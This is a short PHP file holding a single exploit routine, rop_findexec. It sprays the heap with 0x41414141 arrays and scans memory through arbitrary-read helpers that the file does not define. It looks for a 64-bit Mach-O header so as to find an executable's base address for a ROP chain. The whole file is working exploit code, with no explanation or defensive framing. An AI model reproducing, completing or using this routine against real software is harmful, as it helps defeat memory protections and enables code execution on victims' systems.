<?
function rop_findexec() {
$x=[];
$p=ptr()+0;
for($i=0;$i<0x2000;$i++) {
        array_push($x, [0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,0x41414141]);
}
$a=map($p,0x10000)[0];
nogc($a);
$a=bin2hex($a);
nogc($a);
$r=strpos($a,"3100000000000000100000000f0000000c000000010000000c00000000000000");
if($r !== FALSE) {
$a=substr($a, $r+0x80, 0x10);
$a=hexdec(swapEndianness($a));
$a=$a+0;
for($i=0;$i<0x100000;$i++) {
$k=map((($a & (~0xFF)) - (0x100*$i)),0x8);
if("cffaedfe07000001" == bin2hex($k[0]))
{
        return (($a & (~0xFF)) - (0x100*$i)) + 0;
}
}
}
return FALSE;
}
if(isset($wergnijdofkbvlm)) nogc($x);

?>
